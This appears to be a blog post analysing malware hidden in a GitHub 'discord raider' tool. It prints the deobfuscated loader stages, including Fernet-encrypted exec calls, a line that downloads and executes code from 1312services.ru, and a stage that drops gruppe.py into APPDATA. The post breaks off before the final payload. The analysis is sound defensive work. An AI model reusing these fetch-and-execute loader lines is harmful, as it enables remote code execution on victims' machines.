{"title":"Malware hidden within an open source 'discord raider'", "source":"NONE", "date":"8-23-2024", "tags":["cybersecurity","malware"], "description":"Finding the malware hidden in an open source 'discord raider'"}


![This the github repo which contains the malware](/static/11/main.png)

This is the github repo which contains the malware

Hello, I have found something interesting, malware hidden within open source 'discord raider' tools. 

First a quick explanation, a 'discord raider' is a piece of software that spams a server with fake accounts which send messages repeatedly in an attempt to annoy people. These 'tools' are mostly used by 12 year skids, who feel like a master hacker by downloading garbage on to the family computer.

## Part one - github

The github repo for the malware was created about a day ago from writing this, intrestingly enough, the majority of the commits are replacing the single letter in a text file.
The more interesting thing is the account that owns the github repo, one `Michzael-Fuchslocher`, alongside the discord raid repo, they have several other repos, all discord related skid tools. In all of these repos the pattern of the commits being single letter edits continues. I looked at the code for some of these other repos, and they all seem to contain the same malware.

## Part two - the code itself

The main file contains a single line of semi-colon seperated python code, here is what it looks like when the formatting has been fixed.

    #!python
    import os
    os.system('pip install cryptography')
    os.system('pip install fernet')
    os.system('pip install requests')
    from fernet import Fernet
    import requests
    exec(Fernet(b'eORIbqIAo0lgLsUQKh65VDMfpLQ8xTJeOBYNqzILkqc=').decrypt(b'gAAAAABmxNtp4JGXQHPnCdjhaMgtj9NuIVwKOlXS6F_2WmIe3LPVT99J4L_LQTFe7l5E3fxvsHpbwHDOKxE-rr2HZHybMVtOhaDRzcTTmInOhYst6YzoeX8AwdM-3PYCdWDk4S1_EvIe1SjmZcc0N6r86fiT2_keIjsRXlugsw6ji1QUq8K4YV2KNTv0LdE9lQr_t_dKTpszBnN8mg0XElqMPd7UfhlXUQ=='))

You can see that this first payload is attempting to install the librarys `cryptography`, `fernet`, and `requests`. It then imports `Fernet` and `requests` and uses `Fernet` to unencrypt a string, which seems to be the next piece of malware.
This string is then executed by using the builtin `exec()` function.

Replacing the exec with a print gives you this:

    #!python
    exec(requests.get('https://1312services.ru/paste?userid=15').text.replace('<pre>','').replace('</pre>',''))

This payload is quite a lot simpler than the first one, and it can be seen that it gets another payload from `https://1312services.ru/paste?userid=15`, which it then replaces the pre formatted tags.
Then this new payload is also executed.
Again replacing the exec with a print gives you this payload:


    import sys
    import os
    content = """
        import subprocess
        import sys
        subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        from fernet import Fernet
        exec(Fernet(b'M_ne2Y0BqY6Ba6AupGD9SvRH0bMGU2LsYexHftKoI54=').decrypt(b'gAAAAABmyMTtneMFv9I8mobxRSmO0v9hVnMrW5TBOPHfJDFVt0mKMSps003PQ-...').decode())
    """
    gruppe_path = os.path.join(os.getenv('APPDATA'), 'gruppe.py')

    with open(gruppe_path, 'w') as file:
        file.write(content)

    os.system(sys.executable + " " + gruppe_path)

This payload writes another payload into a file called `gruppe.py` on the `appdata` directory on windows.
After running this payload it writes the `content` variable into that `gruppe` file, which again installs and imports fernet, which is used to decrypt a new payload which is then executed. Also the way that the install script is written, it can be seen that this is windows exculsive malware, due to it using `cmd.exe`.
This new payload is this:

